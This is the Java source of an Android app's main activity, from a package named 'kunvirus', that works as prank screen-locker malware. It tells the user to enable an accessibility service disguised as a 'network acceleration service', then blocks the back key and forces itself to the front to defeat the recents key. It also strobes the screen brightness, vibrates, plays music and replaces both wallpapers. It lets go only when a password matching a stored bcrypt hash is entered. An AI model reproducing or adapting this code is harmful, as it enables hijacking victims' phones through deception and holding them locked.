package cn.edu.zjut.kunvirus;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.EditText;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {
    private final String pwdEncrypted="$2a$12$nHcCYECmuxxn5eMxSD9M7uqcT/opA4DpCFewnb7P0mFoLp8ZR61vO";
    private static int screen_vary_cnt=0;
    private final int vary_delay=500;

    class MyTimerTask extends TimerTask {
        public void run() {
            screen_vary_cnt=(screen_vary_cnt+1)%2;//0101...这样变化
            if(screen_vary_cnt==1)
                MainActivity.this.runOnUiThread(() -> setWindowBrightness(0));
            else
                MainActivity.this.runOnUiThread(() -> setWindowBrightness(255));
            new Timer().schedule(new MyTimerTask(), vary_delay);
        }
    }
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        if(!NetUtils.networkConnected(this)){
            System.exit(0);
        }
        if(!serviceOpenCheck()){
            Intent settingIntent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
            startActivity(settingIntent);//跳转到无障碍页面
            Toast.makeText(this, "请在无障碍->已安装的服务中开启“网络加速服务”", Toast.LENGTH_LONG).show();
            System.exit(0);
        }

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        new Timer().schedule(new MyTimerTask(),vary_delay);
        AmazingUtil.openNotifyService(this);
        AmazingUtil.openMusicService(this);
        AmazingUtil.shakeItBaby(this);//手机振动
        AmazingUtil.openVolumeListener(this);//音量监听
        //AmazingUtil.setMaxVolume(this);//音量调节到最大
        AmazingUtil.SetWallPaper(this);
        AmazingUtil.SetLockWallPaper(this);
        Toast.makeText(this,"唱跳rap篮球",Toast.LENGTH_LONG).show();
        //Toast.makeText(this,UserCount.getId(this),Toast.LENGTH_LONG).show();
    }

    public boolean serviceOpenCheck(){
        try {
            int accessibilityEnabled = Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                    Settings.Secure.ACCESSIBILITY_ENABLED);
            Log.i("CuberLuo", String.valueOf(accessibilityEnabled));
            if (accessibilityEnabled == 1){
                String settingValue = Settings.Secure.getString(getApplicationContext().getContentResolver(),
                        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                Log.i("CuberLuo",settingValue);
                if(settingValue.contains("cn.edu.zjut.kunvirus.LockService")){
                    return true;
                }else{
                    return false;
                }
            }else{
                return false;
            }
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
            return false;
        }
    }


    public void exitLockService(View view){
        EditText passwordText = findViewById(R.id.cxkPassword);
        String passwordStr =passwordText.getText().toString();
        if(passwordStr.trim().equals("")){
            Toast.makeText(this, "密码不能为空", Toast.LENGTH_SHORT).show();
        }else if(!SecureUtil.match(passwordStr,pwdEncrypted)){
            Toast.makeText(this, "密码错误", Toast.LENGTH_SHORT).show();
        }else{
            stopService(new Intent(this,MusicService.class));//退出音乐服务
            stopService(new Intent(this,NotifyService.class));//退出通知服务
            System.exit(0);
        }
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {                                                           //重写返回键方法
        if (keyCode == KeyEvent.KEYCODE_BACK) {//禁止用户点击返回键
            return false;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    protected void onPause() {//屏蔽recent键
         super.onPause();
        for (int j = 0; j < 50; j++){
            ActivityManager activityManager = (ActivityManager) getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE);
            activityManager.moveTaskToFront(getTaskId(), 0);
        }
    }

    private void setWindowBrightness(int brightness) {
        Window window = getWindow();
        WindowManager.LayoutParams lp = window.getAttributes();
        lp.screenBrightness = brightness / 255.0f;
        window.setAttributes(lp);
    }
}